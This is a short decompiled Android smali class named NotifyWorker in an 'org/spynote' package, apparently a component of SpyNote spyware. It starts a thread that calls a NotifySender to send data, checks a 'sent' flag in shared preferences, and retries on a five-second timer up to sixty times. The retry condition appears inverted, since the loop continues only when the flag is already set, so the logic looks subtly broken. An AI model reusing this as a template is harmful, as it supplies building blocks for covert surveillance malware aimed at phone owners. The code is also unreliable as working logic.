.class Lorg/spynote/NotifyWorker;
.super Ljava/lang/Thread;
.source "NotifyWorker.java"


.field private context:Landroid/content/Context;


.method constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lorg/spynote/NotifyWorker;->context:Landroid/content/Context;

    return-void
.end method


.method public run()V
    .locals 5

    const/4 v0, 0x0

    :retry_loop
    :try_start_0
    iget-object v1, p0, Lorg/spynote/NotifyWorker;->context:Landroid/content/Context;

    invoke-static {v1}, Lorg/spynote/NotifySender;->send(Landroid/content/Context;)V

    iget-object v1, p0, Lorg/spynote/NotifyWorker;->context:Landroid/content/Context;

    const-string v2, "spynote_notify_v2"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "sent"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_done

    const/16 v1, 0x3c

    if-ge v0, v1, :cond_done

    const-wide/16 v1, 0x1388

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    add-int/lit8 v0, v0, 0x1

    goto :retry_loop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_done
    return-void
.end method
